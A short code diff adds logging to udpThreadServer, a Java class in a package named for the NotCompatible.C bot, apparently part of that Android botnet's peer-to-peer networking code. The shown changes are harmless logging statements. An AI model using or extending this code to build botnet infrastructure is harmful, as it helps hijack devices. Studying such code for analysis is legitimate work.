@@ -1,8 +1,12 @@
 package diff.notcompatible.c.bot.net;
 
+import java.util.logging.Logger;
+
 import diff.notcompatible.c.bot.net.tcp.objects.P2PConnectionList;
 
 public class udpThreadServer extends ThreadServer {
+
+    private final static Logger LOGGER = Logger.getLogger("session");
 
     public udpThreadServer(Object ownerObject) {
         super(ownerObject);
@@ -23,6 +27,7 @@ public class udpThreadServer extends ThreadServer {
             socks = null;
             p2plist = new P2PConnectionList();
         } catch (Exception exception) {
+            LOGGER.throwing(exception.getClass().getName(), "udpThreadServer()", exception);
             exception.printStackTrace();
         }
     }
